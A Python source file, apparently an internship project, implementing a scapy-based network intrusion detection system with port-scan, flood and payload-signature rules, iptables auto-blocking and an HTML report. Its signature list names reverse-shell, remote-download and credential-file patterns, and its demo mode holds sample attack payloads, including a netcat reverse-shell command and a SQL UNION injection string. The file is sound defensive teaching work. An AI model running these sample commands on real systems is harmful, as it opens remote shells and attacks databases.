#!/usr/bin/env python3
"""
Network Intrusion Detection System (NIDS)
CodeAlpha Cybersecurity Internship - Task 4
Author: Abel (CodeAlpha Intern)

A Python-based NIDS that monitors network traffic, detects suspicious activity,
applies custom rules/alerts, logs intrusions, and visualizes detected attacks.
"""

import os
import sys
import json
import time
import argparse
import platform
import threading
from datetime import datetime
from collections import defaultdict

# ──────────────────────────────────────────────────────────────
# Dependency check
# ──────────────────────────────────────────────────────────────
try:
    from scapy.all import sniff, IP, TCP, UDP, ICMP, Raw, get_if_list
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import matplotlib
    matplotlib.use("Agg")          # non-interactive backend (safe for all OSes)
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    MATPLOTLIB_AVAILABLE = True
except ImportError:
    MATPLOTLIB_AVAILABLE = False


# ══════════════════════════════════════════════════════════════
# COLOUR HELPERS
# ══════════════════════════════════════════════════════════════
class Colors:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def c(color, text):
    """Wrap text in ANSI colour codes."""
    return f"{color}{text}{Colors.RESET}"


# ══════════════════════════════════════════════════════════════
# DETECTION RULES
# ══════════════════════════════════════════════════════════════
class DetectionRules:
    """
    All detection logic lives here.  Rules return a dict with
    threat_type, severity, and description when they fire,
    or None when the packet is clean.
    """

    # ── Port-scan thresholds (per source IP) ──────────────────
    PORT_SCAN_THRESHOLD  = 10   # unique ports within window
    PORT_SCAN_WINDOW     = 5    # seconds

    # ── Connection-rate thresholds ────────────────────────────
    SYN_FLOOD_THRESHOLD  = 50   # SYN packets / second per IP
    ICMP_FLOOD_THRESHOLD = 30   # ICMP packets / second per IP

    # ── Well-known suspicious ports ───────────────────────────
    SUSPICIOUS_PORTS = {
        23:   "Telnet (plaintext remote access)",
        445:  "SMB (often exploited – WannaCry, etc.)",
        1433: "MSSQL",
        3306: "MySQL",
        3389: "RDP (Remote Desktop)",
        4444: "Metasploit default listener",
        5900: "VNC",
        6667: "IRC (common C2 channel)",
        8080: "HTTP-alt / proxy",
        8443: "HTTPS-alt",
    }

    # ── Payload signatures (case-insensitive byte patterns) ───
    PAYLOAD_SIGNATURES = [
        (b"select",           "SQL Injection attempt"),
        (b"union select",     "SQL Union Injection"),
        (b"../",              "Directory Traversal"),
        (b"<script>",         "XSS / script injection"),
        (b"/etc/passwd",      "LFI – /etc/passwd read"),
        (b"cmd.exe",          "Windows shell execution"),
        (b"powershell",       "PowerShell execution"),
        (b"wget http",        "Remote file download (wget)"),
        (b"curl http",        "Remote file download (curl)"),
        (b"base64",           "Base64 encoding (possible obfuscation)"),
        (b"exec(",            "Code execution function"),
        (b"eval(",            "Eval execution – code injection"),
        (b"/bin/sh",          "Unix shell reference"),
        (b"nc -e",            "Netcat reverse shell"),
        (b"nmap",             "Nmap scan signature"),
    ]

    def __init__(self):
        # Per-IP state for stateful rules
        self._port_scan_tracker  = defaultdict(lambda: {"ports": set(), "last_reset": time.time()})
        self._syn_counter        = defaultdict(lambda: {"count": 0, "last_reset": time.time()})
        self._icmp_counter       = defaultdict(lambda: {"count": 0, "last_reset": time.time()})
        self._lock = threading.Lock()

    # ── Public entry point ────────────────────────────────────
    def analyze(self, pkt):
        """Return list of alert dicts (may be empty)."""
        alerts = []
        if not pkt.haslayer(IP):
            return alerts

        src = pkt[IP].src
        dst = pkt[IP].dst

        alerts += self._check_port_scan(pkt, src)
        alerts += self._check_syn_flood(pkt, src)
        alerts += self._check_icmp_flood(pkt, src)
        alerts += self._check_suspicious_port(pkt, src, dst)
        alerts += self._check_payload(pkt, src, dst)

        return alerts

    # ── Individual rule checks ────────────────────────────────
    def _check_port_scan(self, pkt, src):
        if not (pkt.haslayer(TCP) or pkt.haslayer(UDP)):
            return []
        port = pkt[TCP].dport if pkt.haslayer(TCP) else pkt[UDP].dport
        with self._lock:
            entry = self._port_scan_tracker[src]
            now   = time.time()
            if now - entry["last_reset"] > self.PORT_SCAN_WINDOW:
                entry["ports"]      = set()
                entry["last_reset"] = now
            entry["ports"].add(port)
            if len(entry["ports"]) >= self.PORT_SCAN_THRESHOLD:
                entry["ports"] = set()   # reset so we don't spam
                return [{"threat_type": "Port Scan",
                         "severity":    "HIGH",
                         "description": f"{src} scanned {self.PORT_SCAN_THRESHOLD}+ ports in "
                                        f"{self.PORT_SCAN_WINDOW}s",
                         "src": src, "dst": "multiple"}]
        return []

    def _check_syn_flood(self, pkt, src):
        if not pkt.haslayer(TCP):
            return []
        if pkt[TCP].flags != 0x02:   # SYN flag only
            return []
        with self._lock:
            entry = self._syn_counter[src]
            now   = time.time()
            if now - entry["last_reset"] >= 1:
                entry["count"]      = 0
                entry["last_reset"] = now
            entry["count"] += 1
            if entry["count"] >= self.SYN_FLOOD_THRESHOLD:
                entry["count"] = 0
                return [{"threat_type": "SYN Flood (DoS)",
                         "severity":    "CRITICAL",
                         "description": f"{src} sent {self.SYN_FLOOD_THRESHOLD}+ SYN packets in 1 s",
                         "src": src, "dst": pkt[IP].dst}]
        return []

    def _check_icmp_flood(self, pkt, src):
        if not pkt.haslayer(ICMP):
            return []
        with self._lock:
            entry = self._icmp_counter[src]
            now   = time.time()
            if now - entry["last_reset"] >= 1:
                entry["count"]      = 0
                entry["last_reset"] = now
            entry["count"] += 1
            if entry["count"] >= self.ICMP_FLOOD_THRESHOLD:
                entry["count"] = 0
                return [{"threat_type": "ICMP Flood (Ping Flood)",
                         "severity":    "HIGH",
                         "description": f"{src} sent {self.ICMP_FLOOD_THRESHOLD}+ ICMP pkts in 1 s",
                         "src": src, "dst": pkt[IP].dst}]
        return []

    def _check_suspicious_port(self, pkt, src, dst):
        alerts = []
        for layer in (TCP, UDP):
            if pkt.haslayer(layer):
                port = pkt[layer].dport
                if port in self.SUSPICIOUS_PORTS:
                    alerts.append({
                        "threat_type": "Suspicious Port Access",
                        "severity":    "MEDIUM",
                        "description": f"Traffic to port {port} ({self.SUSPICIOUS_PORTS[port]})",
                        "src": src, "dst": dst,
                    })
        return alerts

    def _check_payload(self, pkt, src, dst):
        if not pkt.haslayer(Raw):
            return []
        payload = bytes(pkt[Raw].load).lower()
        alerts  = []
        for sig, label in self.PAYLOAD_SIGNATURES:
            if sig in payload:
                alerts.append({
                    "threat_type": "Malicious Payload",
                    "severity":    "CRITICAL",
                    "description": f"{label} detected in payload from {src}",
                    "src": src, "dst": dst,
                })
        return alerts


# ══════════════════════════════════════════════════════════════
# ALERT MANAGER  (logging + console output)
# ══════════════════════════════════════════════════════════════
SEV_COLOR = {
    "CRITICAL": Colors.RED,
    "HIGH":     Colors.YELLOW,
    "MEDIUM":   Colors.CYAN,
    "LOW":      Colors.GREEN,
}

class AlertManager:
    def __init__(self, log_file="logs/alerts.json", verbose=True):
        self.log_file  = log_file
        self.verbose   = verbose
        self.alerts    = []
        self._lock     = threading.Lock()
        os.makedirs(os.path.dirname(log_file), exist_ok=True)

    def record(self, alert: dict):
        alert["timestamp"] = datetime.now().isoformat()
        with self._lock:
            self.alerts.append(alert)
            self._write_log(alert)
        if self.verbose:
            self._print_alert(alert)

    def _write_log(self, alert):
        with open(self.log_file, "a") as f:
            f.write(json.dumps(alert) + "\n")

    def _print_alert(self, a):
        sev   = a["severity"]
        color = SEV_COLOR.get(sev, Colors.WHITE)
        ts    = a["timestamp"][11:19]   # HH:MM:SS
        print(
            f"  [{c(Colors.CYAN, ts)}] "
            f"{c(Colors.BOLD, c(color, f'[{sev}]'))} "
            f"{c(Colors.WHITE, a['threat_type'])} — "
            f"{a['description']}"
        )

    def summary(self):
        return {
            "total":    len(self.alerts),
            "critical": sum(1 for a in self.alerts if a["severity"] == "CRITICAL"),
            "high":     sum(1 for a in self.alerts if a["severity"] == "HIGH"),
            "medium":   sum(1 for a in self.alerts if a["severity"] == "MEDIUM"),
            "low":      sum(1 for a in self.alerts if a["severity"] == "LOW"),
        }


# ══════════════════════════════════════════════════════════════
# RESPONSE MECHANISMS
# ══════════════════════════════════════════════════════════════
class ResponseEngine:
    """
    Automated response actions for detected intrusions.
    On Linux: can use iptables to block IPs.
    On Windows: logs the recommended action (firewall rule).
    """

    def __init__(self, auto_block=False):
        self.auto_block = auto_block
        self.blocked    = set()
        self._is_linux  = (platform.system() == "Linux")

    def respond(self, alert: dict):
        sev = alert.get("severity", "")
        src = alert.get("src", "")

        if sev == "CRITICAL" and self.auto_block and src and src not in self.blocked:
            self._block_ip(src)

    def _block_ip(self, ip):
        self.blocked.add(ip)
        if self._is_linux:
            ret = os.system(f"iptables -A INPUT -s {ip} -j DROP 2>/dev/null")
            status = "blocked via iptables" if ret == 0 else "iptables failed (need root?)"
        else:
            status = "manual block recommended – add Windows Firewall inbound rule for " + ip
        print(c(Colors.RED, f"  [RESPONSE] {ip} → {status}"))

    def unblock_all(self):
        if not self._is_linux:
            return
        for ip in self.blocked:
            os.system(f"iptables -D INPUT -s {ip} -j DROP 2>/dev/null")
        self.blocked.clear()


# ══════════════════════════════════════════════════════════════
# VISUALISER
# ══════════════════════════════════════════════════════════════
def generate_report(alerts, out_dir="reports"):
    """Generate charts + HTML report from alert list."""
    os.makedirs(out_dir, exist_ok=True)

    if not alerts:
        print(c(Colors.YELLOW, "  No alerts to visualise."))
        return

    # ── 1. Severity pie chart ──────────────────────────────────
    if MATPLOTLIB_AVAILABLE:
        sev_counts = defaultdict(int)
        for a in alerts:
            sev_counts[a["severity"]] += 1

        labels = list(sev_counts.keys())
        sizes  = [sev_counts[l] for l in labels]
        colors_map = {"CRITICAL": "#e74c3c", "HIGH": "#e67e22",
                      "MEDIUM":   "#f1c40f", "LOW":  "#2ecc71"}
        pie_colors = [colors_map.get(l, "#95a5a6") for l in labels]

        fig, axes = plt.subplots(1, 2, figsize=(14, 6))
        fig.patch.set_facecolor("#1a1a2e")

        # Pie
        axes[0].set_facecolor("#1a1a2e")
        wedges, texts, autotexts = axes[0].pie(
            sizes, labels=labels, colors=pie_colors,
            autopct="%1.1f%%", startangle=140,
            textprops={"color": "white", "fontsize": 12},
        )
        for at in autotexts:
            at.set_color("white")
        axes[0].set_title("Alerts by Severity", color="white", fontsize=14, fontweight="bold")

        # Bar — threat types
        type_counts = defaultdict(int)
        for a in alerts:
            type_counts[a["threat_type"]] += 1
        axes[1].set_facecolor("#16213e")
        bars = axes[1].barh(list(type_counts.keys()), list(type_counts.values()),
                            color="#00d2ff")
        axes[1].set_xlabel("Count", color="white")
        axes[1].set_title("Alerts by Threat Type", color="white", fontsize=14, fontweight="bold")
        axes[1].tick_params(colors="white")
        for spine in axes[1].spines.values():
            spine.set_edgecolor("#333")
        for bar, val in zip(bars, type_counts.values()):
            axes[1].text(bar.get_width() + 0.1, bar.get_y() + bar.get_height() / 2,
                         str(val), va="center", color="white")

        plt.tight_layout()
        chart_path = os.path.join(out_dir, "attack_chart.png")
        plt.savefig(chart_path, bbox_inches="tight", facecolor=fig.get_facecolor())
        plt.close()
        print(c(Colors.GREEN, f"  Chart saved → {chart_path}"))
    else:
        chart_path = None
        print(c(Colors.YELLOW, "  matplotlib not available – skipping chart."))

    # ── 2. HTML report ─────────────────────────────────────────
    rows = ""
    sev_badge = {"CRITICAL": "#e74c3c", "HIGH": "#e67e22",
                 "MEDIUM":   "#f1c40f", "LOW":  "#2ecc71"}
    for a in alerts:
        col  = sev_badge.get(a["severity"], "#aaa")
        rows += (
            f"<tr>"
            f"<td>{a.get('timestamp','')[:19]}</td>"
            f"<td><span style='background:{col};padding:2px 8px;"
            f"border-radius:4px;color:#111;font-weight:bold'>{a['severity']}</span></td>"
            f"<td>{a['threat_type']}</td>"
            f"<td>{a.get('src','')}</td>"
            f"<td>{a.get('dst','')}</td>"
            f"<td>{a['description']}</td>"
            f"</tr>\n"
        )

    chart_tag = (
        f'<img src="attack_chart.png" alt="Attack Chart" '
        f'style="max-width:100%;border-radius:8px;margin:20px 0">'
        if (chart_path and os.path.exists(chart_path)) else
        "<p style='color:#aaa'>Chart not generated (matplotlib missing).</p>"
    )

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>NIDS Alert Report</title>
<style>
  body {{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',sans-serif;margin:0;padding:24px}}
  h1   {{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:12px}}
  .stat-box {{display:inline-block;background:#161b22;border:1px solid #30363d;
             border-radius:8px;padding:12px 24px;margin:8px;text-align:center}}
  .stat-box .num {{font-size:2em;font-weight:bold}}
  .critical {{color:#e74c3c}} .high {{color:#e67e22}}
  .medium   {{color:#f1c40f}} .low  {{color:#2ecc71}}
  table  {{width:100%;border-collapse:collapse;margin-top:20px}}
  th,td  {{border:1px solid #30363d;padding:10px 14px;text-align:left}}
  th     {{background:#161b22;color:#58a6ff}}
  tr:nth-child(even) {{background:#0d1117}}
  tr:nth-child(odd)  {{background:#161b22}}
  tr:hover           {{background:#1f2937}}
</style>
</head>
<body>
<h1>🛡️ NIDS Intrusion Detection Report</h1>
<p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>

<div>
  <div class="stat-box"><div class="num" style="color:#58a6ff">{len(alerts)}</div>Total Alerts</div>
  <div class="stat-box"><div class="num critical">{sum(1 for a in alerts if a['severity']=='CRITICAL')}</div>Critical</div>
  <div class="stat-box"><div class="num high">{sum(1 for a in alerts if a['severity']=='HIGH')}</div>High</div>
  <div class="stat-box"><div class="num medium">{sum(1 for a in alerts if a['severity']=='MEDIUM')}</div>Medium</div>
  <div class="stat-box"><div class="num low">{sum(1 for a in alerts if a['severity']=='LOW')}</div>Low</div>
</div>

{chart_tag}

<table>
<tr>
  <th>Timestamp</th><th>Severity</th><th>Threat Type</th>
  <th>Source IP</th><th>Destination IP</th><th>Description</th>
</tr>
{rows}
</table>
</body>
</html>"""

    html_path = os.path.join(out_dir, "report.html")
    with open(html_path, "w") as f:
        f.write(html)
    print(c(Colors.GREEN, f"  HTML report → {html_path}"))


# ══════════════════════════════════════════════════════════════
# DEMO MODE  (no network interface needed)
# ══════════════════════════════════════════════════════════════
def run_demo(alert_mgr, response_eng, rules):
    """Simulate realistic attack traffic for demonstration."""
    from scapy.all import Ether
    print(c(Colors.CYAN, "\n  [DEMO] Injecting simulated attack packets…\n"))

    def make_pkt(src, dst, dport, flags=None, proto="tcp", payload=None):
        """Build a minimal scapy packet for demo."""
        ip = IP(src=src, dst=dst)
        if proto == "tcp":
            seg = TCP(dport=dport, flags=flags or "S")
        elif proto == "udp":
            seg = UDP(dport=dport)
        else:
            seg = ICMP()
        pkt = ip / seg
        if payload:
            pkt = pkt / Raw(load=payload)
        return pkt

    scenarios = [
        # (description, list-of-packets)
        ("Port Scan from 10.0.0.1",
         [make_pkt("10.0.0.1", "192.168.1.1", p) for p in range(1, 15)]),
        ("SYN Flood from 10.0.0.2",
         [make_pkt("10.0.0.2", "192.168.1.1", 80) for _ in range(55)]),
        ("Suspicious Telnet access",
         [make_pkt("10.0.0.3", "192.168.1.5", 23, flags="PA",
                   payload=b"admin password")]),
        ("SQL Injection in payload",
         [make_pkt("10.0.0.4", "192.168.1.10", 80, flags="PA",
                   payload=b"GET /login?id=1 UNION SELECT * FROM users--")]),
        ("ICMP Flood from 10.0.0.5",
         [make_pkt("10.0.0.5", "192.168.1.1", 0, proto="icmp")
          for _ in range(35)]),
        ("Metasploit port access",
         [make_pkt("10.0.0.6", "192.168.1.1", 4444)]),
        ("PowerShell payload",
         [make_pkt("10.0.0.7", "192.168.1.1", 443, flags="PA",
                   payload=b"powershell -enc base64encodedpayload")]),
        ("Netcat reverse shell",
         [make_pkt("10.0.0.8", "192.168.1.1", 1234, flags="PA",
                   payload=b"nc -e /bin/sh 10.0.0.8 4444")]),
        ("RDP connection attempt",
         [make_pkt("10.0.0.9", "192.168.1.1", 3389)]),
    ]

    for label, packets in scenarios:
        print(c(Colors.BLUE, f"\n  ▶ Scenario: {label}"))
        for pkt in packets:
            alerts = rules.analyze(pkt)
            for alert in alerts:
                alert_mgr.record(alert)
                response_eng.respond(alert)
        time.sleep(0.1)

    print(c(Colors.GREEN, "\n  [DEMO] Simulation complete.\n"))


# ══════════════════════════════════════════════════════════════
# LIVE SNIFF MODE
# ══════════════════════════════════════════════════════════════
def packet_callback(pkt, rules, alert_mgr, response_eng):
    alerts = rules.analyze(pkt)
    for alert in alerts:
        alert_mgr.record(alert)
        response_eng.respond(alert)


# ══════════════════════════════════════════════════════════════
# BANNER
# ══════════════════════════════════════════════════════════════
BANNER = f"""
{Colors.CYAN}{Colors.BOLD}
  ███╗   ██╗██╗██████╗ ███████╗
  ████╗  ██║██║██╔══██╗██╔════╝
  ██╔██╗ ██║██║██║  ██║███████╗
  ██║╚██╗██║██║██║  ██║╚════██║
  ██║ ╚████║██║██████╔╝███████║
  ╚═╝  ╚═══╝╚═╝╚═════╝ ╚══════╝
{Colors.RESET}
  {Colors.WHITE}Network Intrusion Detection System{Colors.RESET}
  {Colors.YELLOW}CodeAlpha Cybersecurity Internship – Task 4{Colors.RESET}
"""


# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="NIDS – Network Intrusion Detection System")
    parser.add_argument("-i", "--interface", default=None,
                        help="Network interface to listen on (e.g. eth0, Wi-Fi)")
    parser.add_argument("-t", "--timeout",   type=int, default=60,
                        help="Capture duration in seconds (default 60)")
    parser.add_argument("--demo",       action="store_true",
                        help="Run in demo mode with simulated attacks (no real interface needed)")
    parser.add_argument("--auto-block", action="store_true",
                        help="Auto-block CRITICAL IPs via iptables (Linux + root required)")
    parser.add_argument("--report",     action="store_true", default=True,
                        help="Generate HTML report + charts after capture (default: on)")
    parser.add_argument("--log",        default="logs/alerts.json",
                        help="Path to JSON alert log (default: logs/alerts.json)")
    parser.add_argument("--no-verbose", action="store_true",
                        help="Suppress real-time alert output")
    args = parser.parse_args()

    if not SCAPY_AVAILABLE:
        print(c(Colors.RED,
                "  [ERROR] scapy is not installed.\n"
                "  Run:  pip install scapy   (Linux) or\n"
                "        pip install scapy   (Windows – also needs Npcap from npcap.com)"))
        sys.exit(1)

    # Initialise components
    rules        = DetectionRules()
    alert_mgr    = AlertManager(log_file=args.log, verbose=not args.no_verbose)
    response_eng = ResponseEngine(auto_block=args.auto_block)

    print(c(Colors.GREEN,  "  [*] Detection rules loaded"))
    print(c(Colors.GREEN,  "  [*] Alert manager ready"))
    print(c(Colors.YELLOW, f"  [*] Auto-block: {'ON' if args.auto_block else 'OFF'}"))
    print(c(Colors.CYAN,   "  [*] Monitoring started — press Ctrl+C to stop\n"))
    print(c(Colors.WHITE,  "  " + "─" * 70))

    start = time.time()
    try:
        if args.demo:
            run_demo(alert_mgr, response_eng, rules)
        else:
            # Live capture
            iface = args.interface
            if iface is None:
                ifaces = get_if_list()
                print(c(Colors.YELLOW, f"  Available interfaces: {ifaces}"))
                print(c(Colors.YELLOW,
                        "  No interface specified – sniffing on all (may need root/admin)."))
            sniff(
                iface=iface,
                prn=lambda p: packet_callback(p, rules, alert_mgr, response_eng),
                timeout=args.timeout,
                store=False,
            )
    except KeyboardInterrupt:
        print(c(Colors.YELLOW, "\n\n  [!] Capture interrupted by user."))
    except PermissionError:
        print(c(Colors.RED,
                "\n  [ERROR] Permission denied – run as root/Administrator."))
    finally:
        elapsed = time.time() - start
        s = alert_mgr.summary()
        print(c(Colors.WHITE, "\n  " + "─" * 70))
        print(c(Colors.BOLD, "\n  📊  SESSION SUMMARY"))
        print(f"  Duration : {elapsed:.1f}s")
        print(f"  Alerts   : {s['total']}  "
              f"(Critical: {c(Colors.RED, str(s['critical']))}  "
              f"High: {c(Colors.YELLOW, str(s['high']))}  "
              f"Medium: {c(Colors.CYAN, str(s['medium']))}  "
              f"Low: {c(Colors.GREEN, str(s['low']))})")
        print(f"  Log file : {args.log}")
        print()

        if args.report:
            print(c(Colors.CYAN, "  [*] Generating report…"))
            generate_report(alert_mgr.alerts)

        if args.auto_block:
            print(c(Colors.YELLOW, "  [*] Removing iptables rules…"))
            response_eng.unblock_all()

        print(c(Colors.GREEN, "\n  ✅  NIDS session ended.\n"))


if __name__ == "__main__":
    main()
